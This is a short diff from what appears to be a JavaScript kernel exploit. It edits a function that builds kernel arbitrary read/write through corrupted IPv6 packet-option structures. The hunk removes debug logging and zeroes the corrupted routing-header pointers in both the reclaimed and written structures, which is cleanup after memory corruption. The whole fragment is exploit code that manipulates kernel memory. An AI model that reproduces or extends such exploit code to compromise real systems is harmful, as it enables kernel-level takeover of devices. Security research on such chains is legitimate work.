@@ -1461,15 +1461,9 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     // pktopts.ip6po_rthdr = NULL
     const off_ip6po_rthdr = 0x68;
     const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
-    log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
-    kmem.write64(r_rthdr_p, 0);
-    log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
-
     const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
-    log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-    log(kmem.read64(w_rthdr_p));
-    log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-
+    kmem.write64(r_rthdr_p, 0);
+    kmem.write64(w_rthdr_p, 0);
     log('corrupt pointers cleaned');
 
     
